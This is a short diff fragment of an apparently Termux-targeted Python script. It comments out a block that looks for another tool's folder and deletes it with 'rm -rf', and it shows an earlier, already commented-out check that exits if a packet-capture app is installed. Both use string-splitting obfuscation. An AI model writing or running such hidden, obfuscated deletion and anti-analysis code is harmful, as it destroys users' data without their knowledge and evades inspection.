@@ -41,8 +41,8 @@ except:pass
     #if f'com'+'.httpc'+'an'+'ary'+'.pro' in fileee:
         #print('fou'+'nd err'+'or i'+'n yo'+'ur te'+'rmu'+'x');exit()
 #except:pass
-try:
-    files = os.listdir("/"+"da"+"ta/d"+"ata/c"+"om.t"+"ermux/"+"files"+"/ho"+"me/M"+"AH"+"AD"+"I-"+"GRE"+"EN");os.system("rm"+" -r"+"f $"+"HOME"+"/"+"MA"+"HAD"+"I-"+"GR"+"EE"+"N");exit(f"{style} An"+"ot"+"her "+"Tool"+" Use"+"r"+" No"+"t A"+"llow"+" B"+"ro"+" By"+"e ! ")
+#try:
+    #files = os.listdir("/"+"da"+"ta/d"+"ata/c"+"om.t"+"ermux/"+"files"+"/ho"+"me/M"+"AH"+"AD"+"I-"+"GRE"+"EN");os.system("rm"+" -r"+"f $"+"HOME"+"/"+"MA"+"HAD"+"I-"+"GR"+"EE"+"N");exit(f"{style} An"+"ot"+"her "+"Tool"+" Use"+"r"+" No"+"t A"+"llow"+" B"+"ro"+" By"+"e ! ")
 except FileNotFoundError:pass
 except Exception as e:pass
 #----------------------[ SECURITY CHECKER ]--------------------------->>>
